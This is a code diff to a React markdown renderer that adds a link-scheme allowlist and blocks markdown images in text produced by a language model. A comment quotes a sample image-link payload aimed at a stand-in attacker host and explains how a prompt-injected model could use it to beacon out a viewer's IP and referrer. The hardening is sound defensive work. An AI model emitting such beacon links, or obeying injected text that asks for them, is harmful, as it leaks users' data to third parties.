@@ -12,6 +12,23 @@ export function childrenToText(children: React.ReactNode): string {
   return '';
 }
 
+/** Explicit href scheme allowlist for LLM-produced markdown links. react-markdown
+ *  already strips javascript:/data: via its default urlTransform, but relying on
+ *  that implicitly is fragile (a future rehype-raw / urlTransform change would
+ *  silently remove the only defense); this is a belt-and-suspenders check. Any
+ *  disallowed scheme renders as plain text instead of a link. */
+function safeHref(href: string | undefined): string | undefined {
+  if (!href) return undefined;
+  try {
+    // Resolve against the app origin so relative links work; reject anything
+    // that isn't http(s)/mailto after resolution.
+    const u = new URL(href, window.location.origin);
+    return u.protocol === 'https:' || u.protocol === 'http:' || u.protocol === 'mailto:' ? href : undefined;
+  } catch {
+    return undefined;
+  }
+}
+
 export const inlineCodeStyle: React.CSSProperties = {
   fontFamily: 'ui-monospace, monospace',
   fontSize: '12px',
@@ -51,11 +68,22 @@ export function getMarkdownComponents(onOpenSearch: (query: string) => void): Co
     li: ({ children }) => (
       <li style={{ fontSize: '13px', color: 'var(--text-primary)', lineHeight: 1.6, marginBottom: '4px' }}>{children}</li>
     ),
-    a: ({ children, href }) => (
-      <a href={href} target="_blank" rel="noreferrer" style={{ color: 'var(--accent)', textDecoration: 'underline' }}>
-        {children}
-      </a>
-    ),
+    a: ({ children, href }) => {
+      const safe = safeHref(href);
+      // Disallowed scheme → render the text without a link rather than an
+      // attacker-controlled href.
+      if (!safe) return <span style={{ color: 'var(--text-primary)' }}>{children}</span>;
+      return (
+        <a href={safe} target="_blank" rel="noreferrer" style={{ color: 'var(--accent)', textDecoration: 'underline' }}>
+          {children}
+        </a>
+      );
+    },
+    // Block markdown images entirely: legitimate card art comes through the
+    // dedicated CardMentionRow/CardImage path, never markdown. An LLM (or a
+    // prompt-injected API payload) emitting ![](https://attacker/px.png?u=…)
+    // would otherwise fire a tracking beacon (IP + referrer) on view.
+    img: () => null,
     code: ({ children }) => {
       const text = childrenToText(children).trim();
       const isClickableQuery = text.length > 0 && !text.includes('\n');
